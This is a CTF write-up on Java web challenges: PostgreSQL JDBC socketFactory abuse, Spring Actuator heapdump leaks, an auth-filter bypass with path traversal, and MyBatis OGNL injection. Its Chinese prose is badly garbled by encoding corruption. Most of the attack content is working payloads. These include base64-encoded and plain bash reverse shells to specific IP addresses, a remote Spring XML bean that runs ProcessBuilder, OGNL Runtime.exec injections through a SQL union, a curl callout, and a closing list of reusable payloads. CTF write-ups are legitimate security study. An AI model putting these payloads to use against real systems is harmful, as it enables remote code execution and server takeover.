## TestConnection

```java
commons-collections-3.2.1.jar
mysql-connector-java-8.0.11.jar
postgresql-42.3.1.jar
```

```java
public class IndexController {
    @RequestMapping({"/"})
    public String index() {
        return "Hello World!";
    }

    @RequestMapping({"/testConnection"})
    //éœ€è¦ä¼ å…¥å‚æ•° drvier url username password
    public String testConnection(@RequestParam("driver") String driver, @RequestParam("url") String url, @RequestParam("username") String username, @RequestParam("password") String password) {
        try {
            Class.forName(driver);
            DriverManager.getConnection(url, username, password);
            return "success";
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
```

ç›´æ¥æ‰“

é¦–å…ˆå¼€ä¸€ä¸ªhttpæœåŠ¡ï¼Œç„¶åä¸€ä¸ªç›‘å¬åå¼¹shellç«¯å£

```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzguMTMwLjExNi4yNDcvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

```java
driver=jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://8.130.116.247:9999/aaa.xml  è®°å¾—è¿›è¡Œurlç¼–ç ï¼Œéšæœºå†™ä¸€ä¸ªè´¦å·å¯†ç å³å¯
```

![image-20231218214733997](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231218214733997.png)

æœ€åç¯å¢ƒå˜é‡æ‰¾åˆ°flag`env`

![image-20231218215049912](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231218215049912.png)

```java
/testConnection?driver=org.postgresql.Driver&url=jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://host.docker.internal:8000/poc.xml&username=123&password=123
```

```javas
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzguMTMwLjExNi4yNDcvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}</value>
            </list>
        </constructor-arg>
    </bean>
</beans>

bash -i >&/dev/tcp/8.130.116.247/7777 0>&1
```

## spring

æ‰“å¼€ä¸€ä¸ªactuatorï¼Œæ ¹æ®ä»¥å¾€çš„çŸ¥è¯†å¯ä»¥çŸ¥é“æ˜¯ä¸€ç§ä¿¡æ¯æ³„éœ²

![image-20231221200037372](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221200037372.png)

æ¥ä¸‹æ¥å°±æ˜¯çœ‹å¦‚ä½•è®©valueæ˜æ–‡æ˜¾ç¤º

```java
/api-docs
/v2/api-docs
/swagger-ui.html
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
/actuator
/auditevents
/autoconfig
/caches
/conditions
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/health
/actuator/conditions
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/scheduledtasks
/actuator/httptrace
/actuator/jolokia
/actuator/hystrix.stream
```

![image-20231221200410140](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221200410140.png)

è®¿é—®/actuator/heapdump å¯¼å‡ºjvmä¸­çš„å †å†…å­˜ä¿¡æ¯ï¼Œé€šè¿‡ä¸€å®šçš„æŸ¥è¯¢å¾—åˆ°app.passwordçš„æ˜æ–‡

é€šè¿‡åˆ©ç”¨å·¥å…·https://github.com/whwlsfb/JDumpSpider

![image-20231221205615034](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221205615034.png)

#### æœ¬åœ°ç¯å¢ƒæµ‹è¯•

æœ¬åœ°æ­å»ºäº†ä¸€ä¸ªspringbootçš„ç¯å¢ƒï¼Œå‘ç°ä¹Ÿä¼šå‡ºç°æ³„éœ²é—®é¢˜

```java
<dependency>
          <groupId>org.springframework.boot</groupId>
           <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
```

![image-20231221205926681](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221205926681.png)

åœ¨1.xç‰ˆæœ¬ä¸‹ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹ï¼š

management.context-path=/manage

æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†ï¼š

```java
/manage/dump
/manage/autoconfig
```

åœ¨2.xç‰ˆæœ¬ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹ï¼š

```java
management.endpoints.web.base-path=/manage
```

![image-20231221211215598](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221211215598.png)

## auth_bypass_web

é¢˜ç›®é™„ä»¶ç»™äº† AuthFilter.java å’Œ DownloadServlet.java

é¦–å…ˆæ˜¯ä¸€ä¸ªé»‘åå•ï¼Œä¸»è¦è¿‡æ»¤äº†è·¯å¾„ç©¿è¶Šå’Œä»»æ„ä¸‹è½½

```java
public class AuthFilter implements Filter {
    public void init(FilterConfig filterConfig) {
    }

    public void destroy() {
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        if (request.getRequestURI().contains("..")) {
            resp.getWriter().write("blacklist");
        } else if (request.getRequestURI().startsWith("/download")) {
            resp.getWriter().write("unauthorized access");
        } else {
            chain.doFilter(req, resp);
        }
    }
}
```

#### DownloadServlet

```java
public class DownloadServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String currentPath = getServletContext().getRealPath("/assets/");
        Object fileNameParameter = req.getParameter("filename");
        if (fileNameParameter != null) {
            String fileName = (String) fileNameParameter;
            resp.setHeader("Content-Disposition", "attachment;filename=" + fileName);
            FileInputStream input = new FileInputStream(currentPath + fileName);
            Throwable th = null;
            try {
                byte[] buffer = new byte[4096];
                while (input.read(buffer) != -1) {
                    resp.getOutputStream().write(buffer);
                }
                if (input == null) {
                    return;
                }
                if (0 != 0) {
                    try {
                        input.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                } else {
                    input.close();
                }
            } catch (Throwable th3) {
                if (input != null) {
                    if (0 != 0) {
                        try {
                            input.close();
                        } catch (Throwable th4) {
                            th.addSuppressed(th4);
                        }
                    } else {
                        input.close();
                    }
                }
                throw th3;
            }
        } else {
            resp.setContentType("text/html");
            resp.getWriter().write("<a href=\"/download?filename=avatar.jpg\">avatar.jpg</a>");
        }
    }
}
```

å°±ç»™äº†è¿™ä¹ˆä¸¤ä¸ªjavaç±»å…¶ä»–æ²¡ä»»ä½•æ¶ˆæ¯ï¼Œè‚¯å®šæ˜¯ç»•è¿‡ï¼ˆå¤ªæ˜æ˜¾äº†

`if (request.getRequestURI().contains("..")) {`

```java
getRequestURL() å¹¶ä¸ä¼šè¿›è¡Œurlè§£ç 
ä¹Ÿä¸ä¼šå»æ‰å¤šä½™å­—ç¬¦
```

æ—¢ç„¶èƒ½è®¿é—®åˆ°aaè¯´æ˜æ²¡é—®é¢˜ï¼Œæ­£å¸¸è®¿é—®è·¯ç”±åº”è¯¥ä¸º /JYcxk/aaæ‰€ä»¥éƒ½æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡

![image-20231221220801540](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221220801540.png)

![image-20231221220638571](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221220638571.png)

ç„¶åå¯ä»¥é€šè¿‡ `//download?filename=avatar.jpg` ä¸‹è½½æ–‡ä»¶, ä½†æ˜¯æ— æ³•è¯»å– `/flag` (æç¤º Permission denied), é‚£ä¹ˆå¾ˆæ˜æ˜¾éœ€è¦ RCE

æ ¹æ®é¢˜ç›®æè¿°, ç½‘ç«™ä½¿ç”¨ war æ‰“åŒ…ï¼Œç›´æ¥è¯»å–web.xmlé…ç½®æ–‡ä»¶

![image-20231221221312892](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231221221312892.png)

çœ‹æœ¬åœ°æ–‡ä»¶çš„ç›¸å¯¹ä½ç½®

![image-20231222145213294](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222145213294.png)

http://8.130.116.247:50042//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/IndexServlet.class

æ ¹æ®web.xmlè·¯ç”±çš„é…ç½®ï¼Œç›´æ¥ä¸‹è½½classæ–‡ä»¶å³å¯

å¦‚æœè¦ç›´æ¥ä¸‹è½½éƒ¨ç½²çš„waråŒ…ï¼Œéœ€è¦å…ˆçŸ¥é“waråŒ…çš„åå­—

![image-20231222145905214](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222145905214.png)

#### EvilServlet

 ç›´æ¥åå¼¹shellå³å¯ï¼Œæ²¡ä»»ä½•è¿‡æ»¤

```java
public class EvilServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        try {
            Runtime.getRuntime().exec(req.getParameter("Evil_Cmd_Arguments_fe37627fed78"));
            resp.getWriter().write("success");
        } catch (Exception e) {
            resp.getWriter().write("error");
        }
    }
}
```







## mybtaiså‰ç½®çŸ¥è¯†

å…¶å®å°±æ˜¯åœ¨åŠ¨æ€SQLä¸­ï¼Œå¯ä»¥è§£æOGNLè¡¨è¾¾å¼ï¼Œå‰æéœ€è¦æœ‰sqlæ³¨å…¥

ä¸€èˆ¬è€Œè¨€ï¼Œä½¿ç”¨mybatisæœ‰ä¸¤ç§é…ç½®ï¼Œä¸€ç§æ˜¯é€šè¿‡xmlæ–‡ä»¶æ¥é…ç½®ï¼Œå¦ä¸€ç§é€šè¿‡æ³¨è§£çš„æ–¹å¼æ¥é…ç½®

#### 1ã€xmlæ–‡ä»¶

è™½ç„¶bindæ ‡ç­¾valueå±æ€§æ˜¯å¯ä»¥ä¼ å€¼çš„

```java
<if test="name != null and name !=''">
  <bind name="likename" value="name" />
       name like #{likename}
</if>
```

ä½†æ˜¯ï¼Œè¿™é‡Œè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æçš„æ—¶å€™æ˜¯æœ‰é¡ºåº çš„ï¼Œå‡è®¾nameï¼š**${@java.lang.Math@min(4,10)}**

é¦–å…ˆåˆ©ç”¨OGNLè¡¨è¾¾å¼è§£æå™¨è§£ævalueçš„å€¼ï¼Œæ­¤æ—¶å€¼å•çº¯ä¸ºnameå˜é‡ï¼Œå³ï¼š

```java
<bind name="likename" value="name" />
```

ç„¶åå¾—åˆ°å€¼ï¼Œ**${@java.lang.Math@min(4,10)}ï¼Œ**ç„¶åå°†å…¶èµ‹ç»™bindæ ‡ç­¾valueå±æ€§ä¸­çš„nameå˜é‡ï¼Œå³ï¼š

```java
<bind name="likename" value="${@java.lang.Math@min(4,10)}" />
```

è¿™ä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬æ— æ³•ä»¤ä¼ å…¥çš„å˜é‡çš„å€¼è¢«OGNLè¡¨è¾¾å¼è§£æå™¨æ¥è¿›è¡Œè§£æï¼Œä¹Ÿå°±æ— æ³•å®ç°OGNLè¡¨è¾¾å¼æ³¨å…¥

##  2ã€æ³¨è§£

springbootä½¿æˆ‘ä»¬æ‘†è„±äº†å„ç§xmlé…ç½®çš„çƒ¦æ¼ï¼Œå¯¹åº”çš„ï¼Œmybatisä¹Ÿä¸ºspringbootæä¾›äº†å¯¹åº”çš„æ³¨è§£æ¥æ»¡è¶³åŠ¨æ€SQLçš„åŠŸèƒ½ï¼Œä¸»è¦æœ‰ä»¥ä¸‹æ³¨è§£ï¼š

- @Insert
- @Update
- @Delete
- @Select
- @InsertProvider
- @SelectProvider
- @UpdateProvider
- @DeleteProvider

@Insertã€@Updateã€@Deleteå’Œ@Selectè¿™å››ä¸ªæ³¨è§£å¯¹åº”çš„æ˜¯æ•°æ®åº“å¢åˆ æ”¹æŸ¥åŠŸèƒ½ï¼Œæ¯ä¸€ä¸ªéƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„Provideræ³¨è§£æ ‡è¯†

å¸¦æœ‰Provideræ³¨è§£å’Œä¸å¸¦æœ‰Provideræ³¨è§£çš„åŒºåˆ«æ˜¯ï¼Œä½¿ç”¨Provideréœ€è¦è‡ªå·±å®ç°æŸ¥è¯¢ç±»ï¼Œå¹¶ä¸”ä½¿ç”¨åŠ¨æ€SQLä¹Ÿç®€å•å¾ˆå¤šã€‚

ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœ@Updateæ³¨è§£æƒ³è¦å®ç°åŠ¨æ€SQLï¼Œé‚£ä¹ˆä¸€å®šè¦ä½¿ç”¨ **<script>** æ ‡ç­¾ï¼Œå¦‚ä¸‹ï¼š

```Java
@Update({"<script>",
      "update Author",
      "  <set>",
      "    <if test='username != null'>username=#{username},</if>",
      "    <if test='password != null'>password=#{password},</if>",
      "    <if test='email != null'>email=#{email},</if>",
      "    <if test='bio != null'>bio=#{bio}</if>",
      "  </set>",
      "where id=#{id}",
      "</script>"})
void updateAuthorValues(Author author);
```

å¯ä»¥çœ‹åˆ°ï¼Œå¯ä»¥å¼•ç”¨xmlä¸­çš„æ ‡ç­¾ï¼Œç„¶åæ¥ä½¿ç”¨åŠ¨æ€SQL

ä½†è¿™æ ·çš„æ–¹å¼å¾ˆä¸ç¾è§‚ï¼Œè€Œä¸”ä¹Ÿæœ‰ç‚¹é¸¡è‚‹ï¼ˆè¿˜ä¸å¦‚ç›´æ¥ç”¨xmlæ¥é…ç½®äº†ï¼‰

å› æ­¤æœ‰äº†å„ç±»Providerï¼Œå¦‚ï¼š@**SelectProvider**

æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæŸ¥è¯¢æ–¹æ³•ä¸ºï¼š

```Java
@SelectProvider(type = UserDaoProvider.class, method = "findTeacherByName")
Teacher findUserByName(Map<String, Object> map);
```

**SelectProvider** è°ƒç”¨çš„æ–¹æ³•ä¸º**findTeacherByName**ï¼Œå¦‚ä¸‹ï¼š

```Java
  public String findTeacherByName(Map<String, Object> map) {
        String name = (String) map.get("name");
        String s = new SQL() {
            {
                SELECT("id,email");
                FROM("Teacher");
                if(map.get("id")!=null)            
                WHERE("name=#{name}");
            }
        }.toString();
        return s;
    }
}
```

å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æ–¹å¼æ²¡æœ‰ä»»ä½•æ ‡ç­¾ï¼Œä½†æ˜¯åŒæ ·å®ç°äº†åŠ¨æ€SQL

ä»ä¸Šé¢å¯ä»¥å‘ç°å¦‚æœæˆ‘ä»¬ä¼ å…¥nameçš„å€¼ä¸ºï¼š**${@java.lang.Math@min(4,10)}*

å…¶æµç¨‹æ˜¯è¿™æ ·çš„ï¼š

é¦–å…ˆç”Ÿæˆäº†SQLè¯­å¥ä¸ºï¼š

```java
select id,email from Teacher where name = ${@java.lang.Math@min(4,10)};
```

ç»è¿‡ä¸€ç³»åˆ—çš„ä¼ é€’ï¼Œ**ç›¸å½“äºç”Ÿæˆï¼ˆå®é™…ä¸Šå¹¶æœªç”Ÿæˆï¼Œç›´æ¥è§£æçš„ï¼‰**äº†ä¸€ä¸ªå¦‚ä¸‹çš„XMLæ–‡ä»¶ï¼š

```SQL
<select id="findTeacherByName" resultMap="BaseResultMap" parameterType="com.example.mybatis.entity.Teacher">
select id,email from Teacher where name = ${@java.lang.Math@min(4,10)};
</select>
```

ç„¶åè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼š

```SQL
<select id="findTeacherByName" resultMap="BaseResultMap" parameterType="com.example.mybatis.entity.Teacher">
select id,email from Teacher where name = '4';
</select>
```

è§£æå®Œæ¯•ä»¥åå¾—åˆ°nameçš„å˜é‡ï¼Œä¼ å…¥SQLä¸­ï¼š

```SQL
select id,email from Teacher where name = '4';
```

è¿™ä¹Ÿå°±å¯¼è‡´äº†OGNLè¡¨è¾¾å¼æ³¨å…¥

### å½±å“èŒƒå›´ mybatis-spring-boot-starter >=2.0.1ï¼ˆmybatis-spring-boot-starterç»„ä»¶ä»2.0.1ç‰ˆæœ¬å¼€å§‹æ”¯æŒProvideråŠ¨æ€SQLï¼‰

### ä¾‹é¢˜åˆ†æ YourBatis

```java
jackson-2.13.5
mybatis-spring-3.5.3
```

æ ¹æ®é¢˜ç›®å¯çŸ¥æ¼æ´å‘ç”Ÿåœ¨mybatisä¸Š

![image-20231222194851610](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222194851610.png)

![image-20231222195041632](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222195041632.png)

æœ€åæ‹¼æ¥ä¸Šäº†sqlè¯­å¥ï¼Œå’Œä¸Šé¢ç»™å‡ºçš„ä¾‹å­å‡ ä¹ä¸€æ ·ï¼Œå¯¼è‡´sqlæ³¨å…¥è¿›è€Œonglè§£æ

![image-20231222195050535](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222195050535.png)

```java
${@java.lang.Runtime@getRuntime().exec("open /System/Applications/Calculator.app")}
${@java.lang.Runtime@getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
```

ç›´æ¥æ‰“å…¥ä¸Šé¢çš„å‘½ä»¤æ˜¯ä¸å¯¹çš„å› ä¸ºå‡ºç°äº†{}ï¼Œä¼šè¢«è§£æä¸ºå¦ä¸€ä¸ªOGNLè¡¨è¾¾å¼çš„å¼€å¤´å’Œç»“å°¾,éœ€è¦ç”¨åˆ°javaç±»ä¸­è‡ªå¸¦çš„base64è§£ç 

```java
${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek1DNHhNVFl1TWpRM0x6YzNOemNnTUQ0bU1RPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQo=')))}
```

![image-20231222195446663](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222195446663.png)

å¦‚æœæœªå“åº”ï¼Œå»ºè®®æ¢æˆè‡ªå·±çš„çƒ­ç‚¹ï¼ˆæ ¡å›­ç½‘ä¼šæ‹¦æˆªqaqğŸ˜…

![image-20231222200240664](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222200240664.png)

### ä¾‹é¢˜åˆ†æ2022 D3CTF ezsql

```java
hibernate-validator-5.3.6.Final.jar
mybatis-3.5.9.jar
```

Hibernate Validatoræ˜¯Hibernateæä¾›çš„ä¸€ä¸ªå¼€æºæ¡†æ¶ï¼Œä½¿ç”¨æ³¨è§£æ–¹å¼éå¸¸æ–¹ä¾¿å®ç°æœåŠ¡ç«¯çš„æ•°æ®æ ¡éªŒã€‚

æ‰¾ç±»çš„æ—¶å€™å‘ç°è¿™ä¸ªå‚æ•°å¯æ§ï¼Œåªéœ€è¦çœ‹ä»å“ªè°ƒç”¨çš„å³å¯

![image-20231222202614989](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222202614989.png)

æŠŠ16è¿›åˆ¶å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¹¶ä¸”é‡Œé¢ä¸èƒ½åŒ…æ‹¬new

![image-20231222202805873](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222202805873.png)

![image-20231222203336465](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222203336465.png)

```java
${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek1DNHhNVFl1TWpRM0x6YzNOemNnTUQ0bU1RPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQo=')))}
```

ç›¸å½“äºç¦ç”¨äº†ä¸Šé¢çš„ newï¼Œ

```java
/vote/getDetailedVoteById?vid=3) union select null,"${#this.getClass().forName('java.lang.Runtime').getMethods()[14].invoke(#this.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(),'bash,-c,bash -i >& /dev/tcp/121.5.169.223/39876 0>&1'.split(','))}",null,null,null--+
è¿™é‡Œç”¨splitæ˜¯å› ä¸ºå¼•å·è½¬ä¹‰å¤ªéº»çƒ¦äº†
è¿™æ ·éš”å¼€å°±ä¸ç”¨å¼•å·äº†
```

![image-20231222205111231](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222205111231.png)

![image-20231222211120774](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222211120774.png)

#### è¿™é‡Œæ˜¯jdk8çš„ç‰ˆæœ¬

```java
this.getClass().forName("java.lang.Runtime").getMethods()[12].invoke(this.getClass().forName("java.lang.Runtime").getMethods()[6].invoke(this.getClass().forName("java.lang.Runtime")),"calc");
```

```java
this.getClass().forName("java.lang.Runtime").getMethods()[12].invoke(this.getClass().forName("java.lang.Runtime").getMethods()[6].invoke(this.getClass().forName("java.lang.Runtime")),"curl http://8.130.116.247:7777");
```

æœ¬åœ°æµ‹äº†æ˜¯å¯ä»¥é€šçš„ï¼Œçœ‹çš„åˆ«çš„å¸ˆå‚…ä¸å¤ªä¸€æ ·å’Œæˆ‘çš„

![image-20231222211736797](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222211736797.png)

æœ¬åœ°ç¯å¢ƒæ˜¯jdk8ç›´æ¥èµ·jaråŒ…èµ·ä¸æ¥ï¼Œæ„è¯†åˆ°payloadä¸åŒæ˜¯å› ä¸ºjdkç‰ˆæœ¬å·®å¼‚å¯¼è‡´

ä¸éœ€è¦sqlæ³¨å…¥ï¼Œå› ä¸ºä¼šç›´æ¥onglè§£ææ‰€ä»¥ç›´æ¥å†™å°±è¡Œï¼Œç„¶åéœ€è¦å…¨éƒ¨urlç¼–ç 

![image-20231222213224188](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222213224188.png)

![image-20231222213249139](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231222213249139.png)

æ€»ç»“ï¼š

```java
äºŒç§payload
${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek1DNHhNVFl1TWpRM0x6YzNOemNnTUQ0bU1RPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQo=')))}

${#this.getClass().forName('java.lang.Runtime').getMethods()[14].invoke(#this.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(),'bash,-c,bash -i >& /dev/tcp/121.5.169.223/39876 0>&1'.split(','))}
```



## TestConnection(2ç”¨mysqlååºåˆ—åŒ–æ‰“)
